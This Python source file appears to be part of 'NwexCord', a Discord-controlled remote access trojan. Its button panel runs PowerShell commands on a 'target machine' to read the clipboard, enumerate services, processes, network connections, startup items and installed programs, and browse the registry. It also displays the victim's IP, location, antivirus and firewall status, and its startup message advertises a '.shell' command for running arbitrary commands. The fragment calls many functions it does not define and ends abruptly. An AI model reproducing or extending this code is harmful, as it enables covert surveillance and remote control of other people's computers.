import discord
import asyncio
import hashlib
from datetime import datetime, timezone
from core.shell import ShellExecutor


# ========================================
# Tools System
# ========================================

TOOL_COMMANDS = {

    "service": {
        "title": "🔧 Service Manager",
        "cmd": 'powershell "Get-Service | Where-Object {$_.Status -eq \'Running\'} | Select-Object -First 25 Status, Name, DisplayName | Format-Table -AutoSize"',
        "description": "Running services (first 25)"
    },
    "clipboard": {
        "title": "📋 Clipboard Manager",
        "cmd": 'powershell "Get-Clipboard"',
        "description": "Current clipboard content"
    },

}

async def run_tool(interaction: discord.Interaction, tool_key: str):
    """Execute a tool command and edit the current message with the result."""
    tool = TOOL_COMMANDS[tool_key]
    
    # Show loading state by editing the message
    loading_embed = discord.Embed(
        title=f"⏳ {tool['title']}",
        description=f"*{tool['description']}*\n\n⏳ Executing...",
        color=discord.Color.greyple()
    )
    loading_embed.set_footer(text="NwexCord • Tools")
    await interaction.response.edit_message(content=None, embed=loading_embed, view=None)
    
    result = ShellExecutor.execute(tool["cmd"])
    
    output = result["stdout"] if result["stdout"] else result["stderr"]
    if not output:
        output = "No output."
    
    # Discord embed description limit is 4096
    if len(output) > 3800:
        output = output[:3800] + "\n...(truncated)..."
    
    color = discord.Color.green() if result["success"] else discord.Color.red()
    
    embed = discord.Embed(
        title=tool["title"],
        description=f"*{tool['description']}*\n```\n{output}\n```",
        color=color,
        timestamp=datetime.utcnow()
    )
    embed.set_footer(text="NwexCord • Tools")
    
    view = ToolResultView(tool_key)
    await interaction.edit_original_response(content=None, embed=embed, view=view)


class ToolResultView(discord.ui.View):
    """View shown after a tool executes, with Refresh and Back buttons."""
    def __init__(self, tool_key: str):
        super().__init__(timeout=300)
        self.tool_key = tool_key
    
    @discord.ui.button(label="Refresh", emoji="🔄", style=discord.ButtonStyle.success, row=0)
    async def refresh_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await run_tool(interaction, self.tool_key)
    
    @discord.ui.button(label="Back to Tools", emoji="⬅", style=discord.ButtonStyle.secondary, row=0)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        tools_embed = discord.Embed(
            title="🧰 NwexCord Tools",
            description="Select a tool from the buttons below to execute it on the target machine.",
            color=discord.Color.blurple()
        )
        tools_embed.set_footer(text="NwexCord • Tools Panel")
        await interaction.response.edit_message(content=None, embed=embed_tools_panel(), view=ToolsPanelView())


def embed_tools_panel():
    """Create the tools panel embed."""
    embed = discord.Embed(
        title="🧰 NwexCord Tools",
        description="Select a tool from the buttons below to execute it on the target machine.",
        color=discord.Color.blurple()
    )
    embed.set_footer(text="NwexCord • Tools Panel")
    return embed


class ToolsPanelView(discord.ui.View):
    """The panel with all 8 tool buttons."""
    def __init__(self):
        super().__init__(timeout=300)
    
    @discord.ui.button(label="Registry Editor", emoji="🔑", style=discord.ButtonStyle.secondary, row=0)
    async def registry_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        session_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:20].upper()
        embed = build_registry_embed("", session_id)
        view = RegistryView("", session_id)
        await interaction.edit_original_response(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="Active Windows", emoji="🪟", style=discord.ButtonStyle.secondary, row=0)
    async def activewindows_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        session_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:20].upper()
        embed, windows = build_activewindows_embed(session_id)
        view = ActiveWindowsView(session_id)
        await interaction.edit_original_response(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="TCP Connections", emoji="🌐", style=discord.ButtonStyle.secondary, row=0)
    async def tcp_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        session_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:20].upper()
        embed, conns, pg, tp = build_tcp_embed(session_id)
        view = TCPConnectionsView(session_id, pg, conns)
        await interaction.edit_original_response(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="Startup Manager", emoji="🚀", style=discord.ButtonStyle.secondary, row=0)
    async def startup_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        session_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:20].upper()
        items = StartupManager.get_all_items()
        embed, items = build_startup_embed(session_id, items)
        view = StartupManagerView(session_id, items)
        await interaction.edit_original_response(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="Process Manager", emoji="📊", style=discord.ButtonStyle.secondary, row=1)
    async def process_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        session_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:20].upper()
        procs = ProcessManager.get_processes()
        embed, procs, pg, tp = build_process_embed(session_id, 0, procs)
        view = ProcessManagerView(session_id, pg, procs)
        await interaction.edit_original_response(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="Service Manager", emoji="🔧", style=discord.ButtonStyle.secondary, row=1)
    async def service_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await run_tool(interaction, "service")
    
    @discord.ui.button(label="Clipboard", emoji="📋", style=discord.ButtonStyle.secondary, row=1)
    async def clipboard_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await run_tool(interaction, "clipboard")
    
    @discord.ui.button(label="Installed Programs", emoji="💿", style=discord.ButtonStyle.secondary, row=1)
    async def programs_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        session_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:20].upper()
        progs = InstalledProgramsManager.get_programs()
        embed, progs, pg, tp = build_programs_embed(session_id, 0, progs)
        view = InstalledProgramsView(session_id, pg, progs)
        await interaction.edit_original_response(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary, row=2)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        """Return to the startup info message."""
        info = get_sys_info()
        left_col = (
            f"🌐 **IP** : {info.get('IP', 'Unknown')}\n"
            f"👤 **UserName** : {info['UserName']}\n"
            f"🖥️ **PCName** : {info['PCName']}\n"
            f"🪟 **OS** : {info['OS']}\n"
            f"📁 **Client** : {info['Client']}\n"
            f"⚙️ **Process** : {info['Process']}\n"
            f"📅 **DateTime** : {info['DateTime']}\n"
            f"🎇 **GPU** : {info['GPU']}\n"
            f"🧠 **CPU** : {info['CPU']}\n"
            f"🏷️ **Identifier** : {info['Identifier']}\n"
            f"📊 **Ram** : {info['Ram']}"
        )
        right_col = (
            f"📍 **Location** : {info.get('Location', 'Unknown')}\n"
            f"⏱️ **LastReboot** : {info['LastReboot']}\n"
            f"🛡️ **Antivirus** : {info['Antivirus']}\n"
            f"⚠️ **Firewall** : {info['Firewall']}\n"
            f"🌐 **MacAddress** : {info['MacAddress']}\n"
            f"🌍 **DefaultBrowser** : {info['DefaultBrowser']}\n"
            f"🗣️ **CurrentLang** : {info['CurrentLang']}\n"
            f"💻 **Platform** : {info['Platform']}\n"
            f"📋 **Ver** : {info['Ver']}\n"
            f"🔵 **.Net** : {info['.Net']}\n"
            f"🔋 **Battery** : {info['Battery']}"
        )
        embed = discord.Embed(title="[ Information ]", color=discord.Color.dark_theme())
        embed.add_field(name="\u200b", value=left_col, inline=True)
        embed.add_field(name="\u200b", value=right_col, inline=True)
        embed.set_footer(text=f"NwexCord • System Information • {datetime.now().strftime('Today at %#I:%M %p')}")
        msg_content = f"🚀 **NwexCord System Started!**\nUse `.shell <command>` to execute CMD/PowerShell commands on this machine."
        await interaction.response.edit_message(content=msg_content, embed=embed, view=StartupView())


from flask import Flask, Response
import urllib.request
import re

# ========================================
# System Panel
# ========================================

